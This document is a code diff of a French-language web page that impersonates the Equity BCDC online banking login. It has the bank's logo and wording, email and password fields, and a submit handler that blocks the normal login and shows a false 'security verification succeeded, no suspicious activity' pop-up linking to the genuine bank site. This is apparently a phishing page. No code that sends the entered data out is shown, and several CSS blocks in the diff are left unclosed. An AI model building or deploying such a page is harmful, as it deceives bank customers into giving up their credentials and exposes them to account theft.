@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -6,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Connexion</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=Slm5aEsYqlMn5KgJA9-JgqJ0rLF3taxLUQ9aurjXcwMSmGitZ-sqFpyW7J9SL7wTnPuy32Dpw80HJnX8mSYBxg" charset="UTF-8"></script><style>
+<style>
 /* --------------------- LOADER INITIAL --------------------- */
 #loaderWrapper {
     position: fixed;
@@ -164,9 +163,9 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
 }
 
 /* --------------------- RESPONSIVE MOBILE --------------------- */
-@media (max-width: 430px) {
+@media (max-width: 480px) {
     body {
-        height: 50vh;
+        height: 100vh;
         overflow-y: auto;
         padding-bottom: 0;
     }
@@ -175,45 +174,88 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
         opacity: 1;
     }
 
-    /* SVG background étendu sur toute la largeur */
+/* --------------------- RESPONSIVE MOBILE 768px --------------------- */
+@media (max-width: 768px) {
     .svg-container {
         position: relative !important;
         top: 0 !important;
-        left: 0 !important;
-        width: 100% !important;
+        left: 50% !important;
+        width: 90% !important;
+        max-width: 350px !important;
+        transform: translateX(-50%) scaleX(1) !important;
         height: auto !important;
-        transform: none !important;
-        margin: 0 !important;
+        margin: 0 auto !important;
         z-index: -1;
     }
 
-    /* Texte et logo flottant sur le SVG comme desktop */
-    .left-message {
-        position: absolute !important;
-        top: 25% !important; 
-        left: 10% !important;
-        transform: translateX(-10%) !important;
-        text-align: left !important;
-        max-width: 70% !important;
-        margin: 0 !important;
-    }
-    .left-message img {
-        width: 50px !important;
-        margin-bottom: 0px !important;
-    }
-
-    /* Login centré sous SVG et texte */
     .login-wrapper {
         position: relative !important;
         top: auto !important;
-        left: 10% !important;
-        transform: translateX(-25%) !important;
+        left: 50% !important;
+        transform: translateX(-50%) !important;
         margin: 20px auto !important;
         width: 90% !important;
-        max-width: 240px !important;
+        max-width: 350px !important;
     }
 
-    /* Barre inférieure fixe avec boutons */
+    /* Texte et logo sur le SVG pour mobile, même position que desktop */
+    .left-message {
+        position: absolute !important;
+        top: 33% !important;
+        left: 50% !important;
+        transform: translateX(-50%) !important;
+        max-width: 350px !important;
+        text-align: center !important;
+        color: rgba(139,28,28,0.9) !important;
+        position: relative;
+        width: 100%;
+        height: 300px;
+        overflow: hidden;
+    }
+
+    .left-message img {
+        width: 180px !important;
+        display: block !important;
+        margin: 0 auto 10px auto !important;
+    .svg-container svg {
+        width: 100%;
+        height: 100%;
+    }
+
+    .left-message strong {
+        display: block !important;
+        font-size: 48px !important;
+        font-weight: 400 !important;
+        margin-bottom: 10px !important;
+    .branding-text {
+        position: absolute;
+        top: 55%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        text-align: center;
+        color: white;
+        width: 90%;
+        font-size: 1.1rem;
+        font-weight: 600;
+    }
+
+    .left-message span {
+        display: block !important;
+        font-size: 18px !important;
+        font-weight: 400 !important;
+        color: black !important;
+    .branding-subtext {
+        position: absolute;
+        top: 72%;
+        left: 50%;
+        transform: translateX(-50%);
+        text-align: center;
+        color: white;
+        width: 85%;
+        font-size: 0.85rem;
+        opacity: 0.9;
+    }
+
     .login-bottom-buttons {
         position: fixed !important;
         bottom: 0 !important;
@@ -225,6 +267,13 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
         background: white !important;
         z-index: 5 !important;
         box-shadow: 0 -2px 6px rgba(0,0,0,0.1);
+    .logo {
+        position: absolute;
+        top: 20%;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 120px;
+        height: auto;
     }
 
     .login-bottom-buttons .language-btn,
@@ -232,11 +281,22 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
         width: 50px !important;
         height: 50px !important;
         margin: 0 !important;
+    .login-section {
+        margin-top: 30px;
+        width: 90%;
+        margin-left: auto;
+        margin-right: auto;
     }
 
-    /* Masquer texte et flèche pour mobile */
     #selectedLanguage, #languageArrow {
         display: none !important;
+    .footer-buttons {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        padding: 10px;
+        background: white;
     }
 }
 </style>
@@ -278,11 +338,14 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
         </svg>
     </div>
 
-    <!-- Texte flottant sur SVG -->
+    <!-- Colonne blanche -->
+    <div class="login-background"></div>
+
+    <!-- Message gauche -->
     <div class="left-message">
         <img src="images/logoE.png">
         <strong>Bienvenu à Equity BCDC online</strong>
-        <span>Equity online est le guichet unique pour tous vos besoins bancaires</span>
+        <span>Equity online est le guichet unique pour tous vos besoins bancaires ainsi que le logo</span>
     </div>
 
     <!-- Formulaire -->
@@ -314,41 +377,162 @@ button.submit-btn.active { background: rgba(139,28,28,0.9); color:white; cursor:
         </div>
     </div>
 
-    <!-- Barre inférieure boutons -->
+    <!-- Boutons bas -->
     <div class="login-bottom-buttons">
-        <button class="language-btn"><img src="images/langue.png"></button>
-        <span id="selectedLanguage">FR</span>
-        <img id="languageArrow" src="images/arrow.svg">
-        <button class="support-btn"><img src="images/support.png"></button>
+        <button class="language-btn">
+            <img src="images/globe.png">
+            <span id="selectedLanguage">Français</span>
+            <svg id="languageArrow" width="12" height="8" viewBox="0 0 12 8" fill="none">
+                <path d="M1 1L6 6L11 1" stroke="#8B1C1C" stroke-width="2"/>
+            </svg>
+        </button>
+        <button class="support-btn" onclick="window.open('https://equitygroupholdings.com/cd/', '_blank')">
+            <img src="images/chat.png">
+        </button>
     </div>
-</div>
 
-<!-- POP-UP CONFIRMATION -->
-<div class="overlay" id="confirmationPopup">
-    <div class="popup">
-        <span class="close-x">&times;</span>
-        <div class="popup-header">Vérification de sécurité terminée avec succès</div>
-        <div class="popup-subtitle">
-            Toutes les informations de votre compte ont été vérifiées et aucune activité suspecte n’a été détectée.
+    <!-- Overlay sombre -->
+    <div id="overlay" class="overlay"></div>
+
+    <!-- Loader Pop-up Confirmation -->
+    <div id="popupLoader" class="popup-loader">
+        <div class="circle">
+            <div class="dot dot1"></div>
+            <div class="dot dot2"></div>
+            <div class="dot dot3"></div>
+            <div class="dot dot4"></div>
         </div>
     </div>
-</div>
+
+    <!-- Pop-up Langue -->
+    <div id="languagePopup" class="popup">
+        <div class="close-x">×</div>
+        <div class="popup-header">Langue</div>
+        <div class="popup-subtitle">Sélectionnez votre langue préférée</div>
+        <div class="popup-subtitle small">Chagua lugha / Hitamo ururimi / Sélectionnez la langue</div>
+        <div class="language-options">
+            <label class="option">
+                English
+                <input type="radio" name="lang" value="English">
+                <span class="custom-radio"><span class="checkmark"></span></span>
+            </label>
+            <div class="separator"></div>
+            <label class="option">
+                Français
+                <input type="radio" name="lang" value="Français" checked>
+                <span class="custom-radio"><span class="checkmark"></span></span>
+            </label>
+        </div>
+    </div>
+
+    <!-- Pop-up Confirmation Sécurité -->
+    <div id="confirmationPopup" class="popup">
+        <div class="close-x">×</div>
+        <div class="popup-header">Confirmation</div>
+        <div class="popup-subtitle">
+            Vérification de sécurité terminée avec succès. Toutes les informations de votre compte ont été vérifiées et aucune activité suspecte n’a été détectée.<br>
+            <a href="https://equitybcdconline.equitygroupholdings.com/fr-FR/access/login">Connectez-vous pour terminer le processus de sécurité</a>
+        </div>
+    </div>
+
+</div><!-- /mainContent -->
 
 <script>
-// LOGO LOADER
-window.addEventListener('load', () => {
+// ====== LOADER INITIAL ======
+setTimeout(() => {
     const logo = document.getElementById('logo');
-    const loader = document.getElementById('loaderWrapper');
     logo.style.opacity = 1;
-    logo.style.transform = "translate(-50%, -50%) scale(1)";
-    setTimeout(()=>{loader.style.display='none'; document.getElementById('mainContent').style.opacity=1;}, 1200);
+    logo.style.transform = 'translate(-50%, -50%) scale(1)';
+}, 1300);
+setTimeout(() => {
+    document.getElementById("loaderWrapper").style.display = "none";
+    document.getElementById("mainContent").style.opacity = 1;
+}, 2600);
+
+// ====== FORMULAIRE & BUTTON ======
+const emailInput = document.querySelector('input[type="text"]');
+const passwordInput = document.getElementById('passwordField');
+const submitBtn = document.querySelector('button.submit-btn');
+function toggleButton() {
+    if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') submitBtn.classList.add('active');
+    else submitBtn.classList.remove('active');
+}
+emailInput.addEventListener('input', toggleButton);
+passwordInput.addEventListener('input', toggleButton);
+toggleButton();
+
+// ====== TOGGLE MOT DE PASSE (OEIL PARFAIT) ======
+const toggleEye = document.getElementById('toggleEye');
+toggleEye.addEventListener('click', () => {
+    const line = toggleEye.querySelector('line'); 
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        line.style.opacity = "0";
+    } else {
+        passwordInput.type = 'password';
+        line.style.opacity = "1";
+    }
 });
 
-// TOGGLE EYE PASSWORD
-document.getElementById('toggleEye').addEventListener('click', function() {
-    const passwordField = document.getElementById('passwordField');
-    if(passwordField.type === 'password') passwordField.type = 'text';
-    else passwordField.type = 'password';
+// ====== POP-UP LANGUE ======
+const overlay = document.getElementById('overlay');
+const languageBtn = document.querySelector('.language-btn');
+const languagePopup = document.getElementById('languagePopup');
+const languageClose = languagePopup.querySelector('.close-x');
+const languageRadios = document.querySelectorAll('input[name="lang"]');
+languageBtn.addEventListener('click', () => {
+    overlay.classList.add('active');
+    languagePopup.classList.add('active');
+});
+languageClose.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    languagePopup.classList.remove('active');
+});
+const translations = {
+  "Français": { loginTitle: "S'identifier", loginDesc: "Connectez-vous pour continuer. N'oubliez pas que votre mot de passe est le vôtre, ne le communiquez à personne.", emailPlaceholder: "Adresse électronique ou numéro de téléphone portable", passwordPlaceholder: "Inscrire votre mot de passe", forgot: "Mot de passe oublié ?", submit: "S'identifier" },
+  "English": { loginTitle: "Sign In", loginDesc: "Log in to continue. Remember your password is yours, do not share it with anyone.", emailPlaceholder: "Email address or phone number", passwordPlaceholder: "Enter your password", forgot: "Forgot password?", submit: "Sign In" }
+};
+const selectedLanguageSpan = document.getElementById('selectedLanguage');
+const loginTitleElem = document.querySelector('.login-area h1');
+const loginDescElem = document.querySelector('.login-area .description');
+const forgotLink = document.querySelector('.forgot');
+languageRadios.forEach(radio => {
+  radio.addEventListener('change', () => {
+    const lang = radio.value;
+    selectedLanguageSpan.textContent = lang;
+    loginTitleElem.textContent = translations[lang].loginTitle;
+    loginDescElem.textContent = translations[lang].loginDesc;
+    emailInput.placeholder = translations[lang].emailPlaceholder;
+    passwordInput.placeholder = translations[lang].passwordPlaceholder;
+    forgotLink.textContent = translations[lang].forgot;
+    submitBtn.textContent = translations[lang].submit;
+    overlay.classList.remove('active');
+    languagePopup.classList.remove('active');
+  });
+});
+
+// ====== POP-UP CONFIRMATION ======
+const confirmationPopup = document.getElementById('confirmationPopup');
+const confirmationClose = confirmationPopup.querySelector('.close-x');
+const popupLoader = document.getElementById('popupLoader');
+function showConfirmationPopup() {
+    overlay.classList.add('active');
+    popupLoader.style.display = 'block';
+    setTimeout(() => {
+        popupLoader.style.display = 'none';
+        confirmationPopup.classList.add('active');
+    }, 1500);
+}
+confirmationClose.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    confirmationPopup.classList.remove('active');
+});
+
+// ====== FORMULAIRE SUBMIT ======
+const loginForm = document.getElementById('loginForm');
+loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') showConfirmationPopup();
 });
 </script>
 </body>
